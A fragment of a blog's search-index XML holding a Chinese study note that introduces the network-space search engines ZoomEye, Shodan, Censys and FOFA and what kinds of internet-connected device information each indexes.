-<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
-<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
-<h1>其他网络空间搜索引擎</h1>
-<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
-<h2 id="Shodan">Shodan</h2>
-<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
-<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
-<h2 id="Censys">Censys</h2>
-<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
-<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
-<h2 id="FOFA">FOFA</h2>
-<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
-<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
       </tags>
   </entry>
 </search>
